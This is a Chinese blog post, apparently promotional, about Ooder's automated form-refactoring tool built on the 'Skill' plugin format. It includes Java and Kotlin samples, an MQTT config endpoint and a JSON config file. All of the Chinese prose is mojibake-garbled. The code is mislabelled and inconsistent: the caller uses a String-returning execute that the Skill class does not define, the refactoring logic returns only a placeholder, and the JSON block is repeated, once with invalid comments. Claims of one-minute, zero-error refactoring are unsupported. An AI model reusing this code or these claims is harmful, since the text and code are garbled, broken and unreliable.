code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘åˆ·åˆ°å¤ªå¤šå¤§å‚AIå‘å¸ƒä¼šï¼Œå…¨æ˜¯RAGã€æ¨¡å‹å¾®è°ƒã€å¤šæ¨¡æ€è¿™äº›é»‘è¯å †ç Œï¼Œå¬ç€é«˜å¤§ä¸Šï¼Œè½¬å¤´é—®è½åœ°æ¡ˆä¾‹ï¼Œè¦ä¹ˆè¯­ç„‰ä¸è¯¦ï¼Œè¦ä¹ˆè¿˜åœ¨å®éªŒå®¤é˜¶æ®µâ€¦ğŸ¤”</p>
<p>çœŸä¸æ˜¯æ ï¼Œä¼ä¸šè¦çš„ä»æ¥ä¸æ˜¯â€œæ ¸æ­¦å™¨çº§åˆ«çš„æ¦‚å¿µâ€ï¼Œè€Œæ˜¯èƒ½å¿«é€Ÿè§£å†³å®é™…ç—›ç‚¹çš„æŠ€æœ¯ï¼å°±åƒè¡¨å•é‡æ„è¿™ä¸ªä¼ä¸šç³»ç»Ÿç¿»æ–°çš„è€å¤§éš¾â€”â€”å äº†60%å·¥ä½œé‡ï¼Œæ—§è¡¨å•è‡ƒè‚¿éš¾ç»´æŠ¤ã€æ–°æ ·å¼é€‚é…æ…¢ï¼Œäººå·¥æ”¹åŠ¨è¾„å‡ å‘¨èµ·æ­¥ã€‚</p>
<p>è€ŒOoderç›´æ¥ç”¨SkillæŠ€æœ¯ç ´å±€ï¼Œ3å¤©å°±æ¨å‡ºäº†ä¼ä¸šçº§è¡¨å•è‡ªåŠ¨åŒ–é‡æ„æ–¹æ¡ˆï¼Œæ²¡æœ‰è™šå¤´å·´è„‘çš„æ¦‚å¿µï¼Œå…¨æ˜¯èƒ½ç›´æ¥è½åœ°çš„ç¡¬å®åŠ›ï¼</p>
<p>å…ˆç»™ä¸æ‡‚çš„æœ‹å‹ç§‘æ™®ä¸‹æ ¸å¿ƒï¼š<strong>Skillæ˜¯Anthropicæ¨å‡ºçš„æ ‡å‡†åŒ–æŠ€æœ¯</strong>ï¼Œç®€å•è¯´å°±æ˜¯æŠŠç‰¹å®šä»»åŠ¡çš„ä¸“ä¸šæµç¨‹ã€ä»£ç è„šæœ¬ã€èµ„æºæ¨¡æ¿æ‰“åŒ…æˆâ€œæ™ºèƒ½æ’ä»¶â€ï¼Œè®©é€šç”¨AIç¬é—´æ‹¥æœ‰é¢†åŸŸä¸“å®¶çº§èƒ½åŠ›ï¼Œä¸ç”¨åå¤æ•™ã€ä¸ç”¨ç£¨æµç¨‹ã€‚</p>
<p>Ooderçš„ç‰›å°±åœ¨äºï¼ŒæŠŠSkillæŠ€æœ¯ç²¾å‡†é€‚é…ä¼ä¸šè¡¨å•é‡æ„åœºæ™¯ï¼Œè¿˜å’ŒAIã€è‡ªå®¶RADå·¥å…·é“¾æ·±åº¦ç»‘æ­»ï¼Œå½¢æˆäº†ä¸€å¥—é—­ç¯ï¼š</p>
<p>âœ… å…ˆé Skillå®šæ ‡å‡†ï¼šå°è£…è¡¨å•æ‹†åˆ†è§„åˆ™ã€A2UIæ ·å¼æ¨¡æ¿ã€æ³¨è§£è§£æè„šæœ¬ï¼Œä¸ç®¡å“ªä¸ªå›¢é˜Ÿç”¨ï¼Œè¾“å‡ºçš„ä»£ç éƒ½ç¬¦åˆä¼ä¸šè§„èŒƒï¼Œé¿å…æ‚ä¹±æ— ç« ï¼›</p>
<p>âœ… å†è®©AIåšæ™ºèƒ½å†³ç­–ï¼šSkillæä¾›åŸºç¡€æ¡†æ¶ï¼ŒAIåŸºäºä¸šåŠ¡è¯­ä¹‰è‡ªåŠ¨åˆ¤æ–­â€œç”¨æˆ·åã€å¯†ç å½’ä¸ºåŸºæœ¬ä¿¡æ¯â€â€œé‚®ç®±å½’ä¸ºè”ç³»ä¿¡æ¯â€ï¼Œåˆ†å—ä¸ç”Ÿç¡¬ï¼Œä¸ç”¨äººå·¥å¹²é¢„ï¼›</p>
<p>âœ… æœ€åRADå·¥å…·é“¾å…œåº•ï¼šè‡ªåŠ¨ç¼–è¯‘æ ¡éªŒã€ç”Ÿæˆé‡æ„æŠ¥å‘Šï¼Œè¿˜æ”¯æŒMQTTå®æ—¶ç›‘æ§ä»»åŠ¡çŠ¶æ€ï¼Œå¤§è§„æ¨¡é‡æ„ä¹Ÿä¸æ€•å‡ºé—®é¢˜ã€‚</p>
<p>æ”¾ä¸ªç›´è§‚å¯¹æ¯”ï¼Œæ„Ÿå—ä¸‹æ•ˆç‡ï¼š</p>
<p>æ—§è¡¨å•ä»£ç ï¼ˆæ‰å¹³è‡ƒè‚¿ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@FormAnnotation</span>(title = <span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯è¡¨å•"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserForm</span> {
    <span class="hljs-meta">@FieldAnnotation</span>(name = <span class="hljs-string">"ç”¨æˆ·å"</span>, <span class="hljs-keyword">type</span> = <span class="hljs-title class_">FieldType</span>.<span class="hljs-property">TEXT</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> username;
    <span class="hljs-meta">@FieldAnnotation</span>(name = <span class="hljs-string">"å¯†ç "</span>, <span class="hljs-keyword">type</span> = <span class="hljs-title class_">FieldType</span>.<span class="hljs-property">PASSWORD</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> password;
    <span class="hljs-meta">@FieldAnnotation</span>(name = <span class="hljs-string">"é‚®ç®±"</span>, <span class="hljs-keyword">type</span> = <span class="hljs-title class_">FieldType</span>.<span class="hljs-property">EMAIL</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> email;
    <span class="hljs-comment">// æ›´å¤šå­—æ®µ...</span>
}
</code></pre>
<p>é‡æ„åä»£ç ï¼ˆåˆ†å—æ¸…æ™°ï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@BlockFormAnnotation(title = <span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯è¡¨å•"</span>)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserForm</span> {
    <span class="hljs-meta">@GroupItemAnnotation(title = <span class="hljs-string">"åŸºæœ¬ä¿¡æ¯"</span>, order = 1)</span>
    <span class="hljs-keyword">public</span> static <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicInfo</span> {
        <span class="hljs-meta">@FieldAnnotation(name = <span class="hljs-string">"ç”¨æˆ·å"</span>, type = FieldType.TEXT)</span>
        <span class="hljs-keyword">private</span> String username;
        <span class="hljs-meta">@FieldAnnotation(name = <span class="hljs-string">"å¯†ç "</span>, type = FieldType.PASSWORD)</span>
        <span class="hljs-keyword">private</span> String password;
    }
    <span class="hljs-meta">@GroupItemAnnotation(title = <span class="hljs-string">"è”ç³»ä¿¡æ¯"</span>, order = 2)</span>
    <span class="hljs-keyword">public</span> static <span class="hljs-keyword">class</span> <span class="hljs-title class_">ContactInfo</span> {
        <span class="hljs-meta">@FieldAnnotation(name = <span class="hljs-string">"é‚®ç®±"</span>, type = FieldType.EMAIL)</span>
        <span class="hljs-keyword">private</span> String email;
    }
}
</code></pre>
<p>å…³é”®æ˜¯è¿™ä¸€åˆ‡éƒ½æ˜¯è‡ªåŠ¨åŒ–çš„ï¼Skillè´Ÿè´£â€œæŒ‰è§„çŸ©å¹²æ´»â€ï¼ŒAIè´Ÿè´£â€œèªæ˜åœ°å¹²æ´»â€ï¼ŒåŸæ¥1ä¸ªå·¥ç¨‹å¸ˆ1å¤©æ”¹1ä¸ªè¡¨å•ï¼Œç°åœ¨1åˆ†é’Ÿæå®šï¼Œè¿˜é›¶å‡ºé”™ã€‚</p>
<p>è€Œä¸”éƒ¨ç½²è¶…ç®€å•ï¼ä¸ç®¡æ˜¯æœ¬åœ°æµ‹è¯•è¿˜æ˜¯äº‘ç«¯è§„æ¨¡åŒ–è¿è¡Œï¼Œéƒ½æœ‰ç°æˆå®æˆ˜ä»£ç å¯ç›´æ¥å¤ç”¨ï¼Œè¿™æ‰æ˜¯ä¼ä¸šçº§æŠ€æœ¯è¯¥æœ‰çš„å‹å¥½åº¦ï½</p>
<p>å…ˆçœ‹æœ¬åœ°Soloç¯å¢ƒæ³¨å†Œæµ‹è¯•ï¼ˆå¼€å‘å¿…å¤‡ï¼Œå¿«é€ŸéªŒè¯åŠŸèƒ½ï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.nio.file.Files;
<span class="hljs-keyword">import</span> java.nio.file.Path;
<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SoloSkillRegister</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIG_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">"skill-config.json"</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. åŠ è½½Skillé…ç½®æ–‡ä»¶</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">configContent</span> <span class="hljs-operator">=</span> Files.readString(Path.of(CONFIG_PATH));
            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">configJson</span> <span class="hljs-operator">=</span> JSONObject.parseObject(configContent);
            
            <span class="hljs-comment">// 2. åˆå§‹åŒ–è¡¨å•é‡æ„Skill</span>
            <span class="hljs-type">OoderFormRefactorSkill</span> <span class="hljs-variable">skill</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OoderFormRefactorSkill</span>();
            skill.init(configJson);
            
            <span class="hljs-comment">// 3. æ‰§è¡Œæµ‹è¯•ï¼ŒéªŒè¯åŠŸèƒ½å¯ç”¨æ€§</span>
            skill.test();
            
            <span class="hljs-comment">// 4. æœ¬åœ°è¯•è·‘é‡æ„ï¼ˆè¾“å…¥æ—§è¡¨å•ä»£ç ï¼Œè¾“å‡ºç»“æœï¼‰</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">oldFormCode</span> <span class="hljs-operator">=</span> Files.readString(Path.of(<span class="hljs-string">"old/UserForm.java"</span>));
            <span class="hljs-type">String</span> <span class="hljs-variable">refactoredCode</span> <span class="hljs-operator">=</span> skill.execute(oldFormCode);
            
            <span class="hljs-comment">// 5. ä¿å­˜ç»“æœï¼Œæœ¬åœ°æŸ¥çœ‹æ•ˆæœ</span>
            Files.writeString(Path.of(<span class="hljs-string">"new/UserForm.java"</span>), refactoredCode);
            System.out.println(<span class="hljs-string">"Skill test completed successfully!"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.err.println(<span class="hljs-string">"Error during skill registration: "</span> + e.getMessage());
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>å†çœ‹äº‘ç«¯éƒ¨ç½²ç¯å¢ƒæ³¨å†Œï¼ˆä¼ä¸šè§„æ¨¡åŒ–ä½¿ç”¨ï¼‰ï¼š</p>
<ol>
<li>æŠŠSkillæ‰“åŒ…æˆå‹ç¼©åŒ…ï¼ˆå«ä¸»ç±»ã€é…ç½®ã€è„šæœ¬ï¼‰ï¼›2. ç™»å½•Ooder-RADå¹³å°â†’è¿›å…¥Skillç®¡ç†â†’ä¸Šä¼ åŒ…ï¼›3. é…ç½®å‚æ•°ï¼ˆå¤ç”¨æœ¬åœ°é…ç½®ï¼Œæ”¹æ”¹ç¯å¢ƒåœ°å€å³å¯ï¼‰ï¼›4. å¯ç”¨Skillï¼Œå°±èƒ½æ‰¹é‡è·‘è¡¨å•é‡æ„ä»»åŠ¡äº†ï¼</li>
</ol>
<p>æ ¸å¿ƒçš„Skillä¸»ç±»å®ç°ä¹Ÿç»™å¤§å®¶æ”¾è¿™ï¼ˆè¡¨å•é‡æ„çš„æ ¸å¿ƒé€»è¾‘éƒ½åœ¨è¿™ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OoderFormRefactorSkill</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Skill</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span> config;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">JSONObject config</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = config;
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"OoderFormRefactorSkill initialized with config: "</span> + config);
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">SkillContext context</span>) {
        <span class="hljs-comment">// 1. è·å–å¾…é‡æ„çš„æ—§è¡¨å•ä»£ç </span>
        <span class="hljs-title class_">String</span> formCode = context.<span class="hljs-title function_">getInput</span>(<span class="hljs-string">"formCode"</span>);
        
        <span class="hljs-comment">// 2. æ‰§è¡Œæ ¸å¿ƒé‡æ„é€»è¾‘ï¼ˆè¯†åˆ«æ—§ç»“æ„â†’åˆ†å—â†’ç”Ÿæˆæ–°ä»£ç ï¼‰</span>
        <span class="hljs-title class_">String</span> refactoredCode = <span class="hljs-title function_">refactorForm</span>(formCode);
        
        <span class="hljs-comment">// 3. è¾“å‡ºé‡æ„ç»“æœ</span>
        context.<span class="hljs-title function_">setOutput</span>(<span class="hljs-string">"refactoredCode"</span>, refactoredCode);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Form refactoring completed!"</span>);
    }
    
    <span class="hljs-comment">// è¡¨å•é‡æ„æ ¸å¿ƒé€»è¾‘</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">refactorForm</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> formCode</span>) {
        <span class="hljs-comment">// 1. è¯†åˆ«æ—§ç‰ˆè¡¨å•ç»“æ„ï¼ˆè§£æ@FormAnnotationæ³¨è§£ï¼‰</span>
        <span class="hljs-comment">// 2. æŒ‰ä¸šåŠ¡è¯­ä¹‰æ‹†åˆ†è¡¨å•ï¼ˆå’ŒAIååŒï¼Œç²¾å‡†åˆ†å—ï¼‰</span>
        <span class="hljs-comment">// 3. ç”Ÿæˆç¬¦åˆOoderè§„èŒƒçš„æ–°ç‰ˆä»£ç </span>
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">generateRefactoredForm</span>(formCode);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">generateRefactoredForm</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> formCode</span>) {
        <span class="hljs-comment">// ç”Ÿæˆé‡æ„åçš„åˆ†å—è¡¨å•ä»£ç ï¼ˆå¯¹åº”å‰é¢çš„é‡æ„åç¤ºä¾‹ï¼‰</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"// é‡æ„åçš„è¡¨å•ä»£ç ..."</span>;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"OoderFormRefactorSkill test executed!"</span>);
    }
}
</code></pre>
<p>è¿˜æœ‰MQTTé›†æˆå®ç°ï¼ˆå®æ—¶ç›‘æ§ä»»åŠ¡çŠ¶æ€ï¼Œè¿ç»´å¿…å¤‡ï¼‰ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> net.ooder.framework.mqtt.<span class="hljs-keyword">annotation</span>.MQTTAnnotation;
<span class="hljs-keyword">import</span> net.ooder.framework.web.<span class="hljs-keyword">annotation</span>.RequestMapping;
<span class="hljs-keyword">import</span> net.ooder.framework.web.<span class="hljs-keyword">annotation</span>.ResponseBody;

<span class="hljs-meta">@RequestMapping(name = <span class="hljs-string">"UserJMQ"</span>)</span>
<span class="hljs-meta">@MQTTAnnotation</span>
<span class="hljs-meta">@ResponseBody</span>
<span class="hljs-keyword">public</span> ResultModel&lt;JMQConfig&gt; getUserJMQ() {
    ResultModel&lt;JMQConfig&gt; resultModel = new ResultModel&lt;&gt;();
    
    <span class="hljs-comment">// è·å–MQTTé…ç½®ï¼Œå®ç°ä»»åŠ¡çŠ¶æ€å®æ—¶æ¨é€</span>
    JMQConfig jmqConfig = new JMQConfig();
    jmqConfig.setBrokerUrl(<span class="hljs-string">"tcp://mqtt.example.com:1883"</span>);
    jmqConfig.setClientId(<span class="hljs-string">"ooder-client-"</span> + UUID.randomUUID());
    jmqConfig.setUsername(<span class="hljs-string">"ooder"</span>);
    jmqConfig.setPassword(<span class="hljs-string">"password"</span>);
    
    resultModel.setData(jmqConfig);
    <span class="hljs-keyword">return</span> resultModel;
}
</code></pre>
<p>æœ€åè¡¥å…¨æ ¸å¿ƒçš„Skillé…ç½®æ–‡ä»¶ï¼ˆskill-config.jsonï¼‰ï¼Œæ”¹æ”¹å‚æ•°å°±èƒ½ç”¨ï¼š</p>
<p>ç»™å¤§å®¶æ”¾ä¸ªæ ¸å¿ƒçš„Skillé…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆå®é™…ç”¨çš„æ—¶å€™æ”¹æ”¹å‚æ•°å°±è¡Œï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"skill"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OoderFormRefactorSkill"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"defaultPriority"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"P0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"dsmEngine"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://localhost:8080/dsm"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"authToken"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"timeout"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30000</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"maxRetries"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"compilation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"mvn compile"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"timeout"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">60000</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"output"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"basePath"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"src/main/java"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"packageBase"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"net.ooder.dsm.aggregation.api.method"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"mqttConfig"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"brokerUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tcp://mqtt.ooder.com:1883"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"qos"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"reconnectInterval"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5000</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ç»™å¤§å®¶æ”¾ä¸ªæ ¸å¿ƒçš„Skillé…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆå®é™…ç”¨çš„æ—¶å€™æ”¹æ”¹å‚æ•°å°±è¡Œï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"skill"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"OoderFormRefactorSkill"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// Skillå”¯ä¸€æ ‡è¯†ï¼Œç¡®ä¿èƒ½è¢«RADå·¥å…·é“¾è¯†åˆ«</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// å¼€å¯SkillåŠŸèƒ½</span>
  <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"dsmEngine"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// è¯­ä¹‰è§£æå¼•æ“é…ç½®ï¼Œæ”¯æ’‘AIåˆ†å—å†³ç­–</span>
      <span class="hljs-attr">"url"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://localhost:8080/dsm"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"timeout"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">30000</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"compilation"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// ç¼–è¯‘æ ¡éªŒé…ç½®ï¼Œè‡ªåŠ¨å…œåº•ä»£ç è´¨é‡</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"mvn compile -DskipTests"</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"output"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// è¾“å‡ºæ§åˆ¶ï¼Œé¿å…è¦†ç›–æ—§ä»£ç ï¼Œå®‰å…¨ç¬¬ä¸€</span>
      <span class="hljs-attr">"basePath"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"src/main/java"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"overwritePolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"merge"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"backupOldCode"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"mqttConfig"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// å®æ—¶ç›‘æ§é…ç½®ï¼Œå¤§è§„æ¨¡ä»»åŠ¡ä¸æ€•å‡ºé—®é¢˜</span>
      <span class="hljs-attr">"brokerUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tcp://mqtt.ooder.com:1883"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"qos"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"reconnectInterval"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5000</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å…³é”®é…ç½®&amp;ä»£ç è¯´æ˜ï¼š</p>
<ul>
<li>é…ç½®æ–‡ä»¶é‡Œçš„<code>dsmEngine</code>æ˜¯æ”¯æ’‘AIè¯­ä¹‰åˆ†å—çš„æ ¸å¿ƒï¼Œ<code>mqttConfig</code>è´Ÿè´£å®æ—¶æ¨é€ä»»åŠ¡çŠ¶æ€ï¼›</li>
<li>æœ¬åœ°æ³¨å†Œä»£ç æ ¸å¿ƒæ˜¯â€œåŠ è½½é…ç½®â†’åˆå§‹åŒ–Skillâ†’æµ‹è¯•â†’è¯•è·‘é‡æ„â€ï¼Œä¸€æ­¥åˆ°ä½éªŒè¯åŠŸèƒ½ï¼›</li>
<li>Skillä¸»ç±»çš„<code>execute</code>æ–¹æ³•æ˜¯æ ¸å¿ƒï¼Œæ¥æ”¶æ—§è¡¨å•ä»£ç ï¼Œè¾“å‡ºé‡æ„ç»“æœï¼Œé€»è¾‘æ¸…æ™°å¯å¤ç”¨ï¼›</li>
<li>æ‰€æœ‰ä»£ç éƒ½éµå¾ªOoder-RADå·¥å…·é“¾çš„â€œæ¥å£åŒ–è®¾è®¡ã€åˆ†å—è®¾è®¡â€ç†å¿µï¼Œä¿è¯å¯ç»´æŠ¤æ€§ã€‚</li>
</ul>
<p>è¿™æ‰æ˜¯ä¼ä¸šéœ€è¦çš„AIæŠ€æœ¯â€”â€”ä¸æ˜¯æ‹¿é»‘è¯åŒ…è£…æ¦‚å¿µï¼Œè€Œæ˜¯ç”¨æˆç†Ÿçš„Skillæ ‡å‡†åŒ–èƒ½åŠ›ï¼Œè§£å†³çœŸå®çš„æ•ˆç‡ç—›ç‚¹ã€‚Ooderè¿™æ³¢æ“ä½œï¼ŒæŠŠâ€œAIè½åœ°éš¾â€çš„é—®é¢˜ç›´æ¥ç»™æ‰“ç©¿äº†ï¼</p>
